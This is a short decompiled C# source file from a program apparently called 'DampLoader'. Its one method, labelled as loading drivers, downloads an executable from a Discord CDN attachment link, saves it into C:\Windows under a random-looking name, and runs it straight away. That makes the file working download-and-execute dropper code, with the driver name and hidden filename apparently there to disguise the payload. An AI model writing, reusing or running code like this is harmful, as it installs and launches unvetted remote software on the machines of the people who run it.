using System;
using System.Diagnostics;
using System.Net;

namespace DampLoader
{
	// Token: 0x02000008 RID: 8
	internal class Drivers
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002260 File Offset: 0x00000460
		public static void LoadDrivers()
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\kiagjfitrbqubgraijfnajgshgoiabgiahngflkabgvbfihnf.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734105822975623278/ALTapexDRV.exe", fileName);
			Process.Start(fileName);
		}
	}
}
